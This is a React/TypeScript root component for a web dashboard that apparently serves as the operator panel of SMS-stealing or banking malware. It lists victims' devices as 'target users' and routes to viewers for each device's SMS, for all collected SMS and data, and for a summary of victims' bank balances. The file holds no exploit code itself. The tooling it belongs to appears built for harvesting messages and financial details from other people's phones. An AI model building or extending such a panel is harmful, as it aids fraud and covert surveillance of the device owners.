import React, { useState, useCallback } from 'react';
import Login from './components/Login';
import Home from './components/Home';
import SmsViewer from './components/Dashboard'; 
import UserDataViewer from './components/UserDataViewer';
import GlobalDataViewer from './components/GlobalDataViewer';
import Notifications from './components/Notifications';
import FavoritesList from './components/FavoritesList';
import MessagesViewer from './components/MessagesViewer';
import BankBalanceSummary from './components/BankBalanceSummary';
import { User, AppState, DeviceInfo, Screen } from './types';
import { logoutUser, markUserAsChecked } from './services/firebase';

const App: React.FC = () => {
  const [appState, setAppState] = useState<AppState>({
    user: null,
    currentScreen: 'LOGIN',
    selectedTargetUser: null
  });

  const [highlightUserId, setHighlightUserId] = useState<string | null>(null);

  const handleLoginSuccess = (user: User) => {
    setAppState(prev => ({ ...prev, user, currentScreen: 'HOME' }));
  };

  const handleLogout = () => {
    logoutUser();
    window.location.reload();
  };

  const handleSelectUserForSMS = useCallback((device: DeviceInfo) => {
    markUserAsChecked(device.userId);
    setAppState(prev => ({ ...prev, selectedTargetUser: device, currentScreen: 'SMS_VIEW' }));
  }, []);

  const handleSelectUserForData = useCallback((device: DeviceInfo) => {
    markUserAsChecked(device.userId);
    setAppState(prev => ({ ...prev, selectedTargetUser: device, currentScreen: 'DATA_VIEW' }));
  }, []);

  const navigateTo = (screen: Screen) => {
    setAppState(prev => ({ ...prev, currentScreen: screen, selectedTargetUser: null }));
  };

  const handleBackToHome = () => {
    setAppState(prev => ({ ...prev, selectedTargetUser: null, currentScreen: 'HOME' }));
  };

  const handleViewUser = (device: DeviceInfo) => {
    setHighlightUserId(device.userId);
    setAppState(prev => ({ ...prev, selectedTargetUser: null, currentScreen: 'HOME' }));
    // Clear highlight after scroll/view
    setTimeout(() => setHighlightUserId(null), 3000);
  };

  const handleBottomNav = (id: string) => {
    if (id === 'MESSAGES') navigateTo('MESSAGES');
    else if (id === 'BANK_SUM') navigateTo('BANK_SUMMARY');
    else if (id === 'GLOBAL_SMS') navigateTo('GLOBAL_SMS');
    else if (id === 'GLOBAL_DATA') navigateTo('GLOBAL_DATA');
    else if (id === 'HOME') navigateTo('HOME');
    else if (id === 'FAVORITES') navigateTo('FAVORITES');
  };

  if (appState.currentScreen === 'LOGIN') {
    return <Login onLoginSuccess={handleLoginSuccess} />;
  }

  const isHomeVisible = appState.currentScreen === 'HOME';

  return (
    <div className="h-full w-full relative">
      <div className={isHomeVisible ? 'h-full w-full' : 'hidden'}>
        <Home 
          onSelectUserForSMS={handleSelectUserForSMS}
          onSelectUserForData={handleSelectUserForData}
          onGlobalSMS={() => navigateTo('GLOBAL_SMS')}
          onGlobalData={() => navigateTo('GLOBAL_DATA')}
          onLogout={handleLogout}
          onOpenNotifications={() => navigateTo('NOTIFICATIONS')}
          onOpenFavorites={() => navigateTo('FAVORITES')}
          onNav={handleBottomNav}
          user={appState.user}
          highlightUserId={highlightUserId}
        />
      </div>

      {!isHomeVisible && (
        <div className="h-full w-full absolute inset-0 z-50 bg-white">
          {(() => {
            switch (appState.currentScreen) {
              case 'SMS_VIEW':
                return appState.selectedTargetUser ? (
                  <SmsViewer targetUser={appState.selectedTargetUser} onBack={handleBackToHome} />
                ) : null;
              case 'GLOBAL_SMS':
                return <SmsViewer targetUser={null} onBack={handleBackToHome} />;
              case 'DATA_VIEW':
                return appState.selectedTargetUser ? (
                  <UserDataViewer targetUser={appState.selectedTargetUser} onBack={handleBackToHome} />
                ) : null;
              case 'GLOBAL_DATA':
                return <GlobalDataViewer onBack={handleBackToHome} />;
              case 'NOTIFICATIONS':
                return <Notifications onBack={handleBackToHome} />;
              case 'FAVORITES':
                return (
                  <FavoritesList 
                    onBack={handleBackToHome} 
                    onSelectUserForSMS={handleSelectUserForSMS}
                    onSelectUserForData={handleSelectUserForData}
                    user={appState.user}
                  />
                );
              case 'BANK_SUMMARY':
                return (
                  <BankBalanceSummary 
                    onBack={handleBackToHome}
                    onSelectUserForSMS={handleSelectUserForSMS}
                    onSelectUserForData={handleSelectUserForData}
                    onViewUser={handleViewUser}
                  />
                );
              case 'MESSAGES':
                return <MessagesViewer onBack={handleBackToHome} />;
              default:
                return null;
            }
          })()}
        </div>
      )}
    </div>
  );
};

export default App;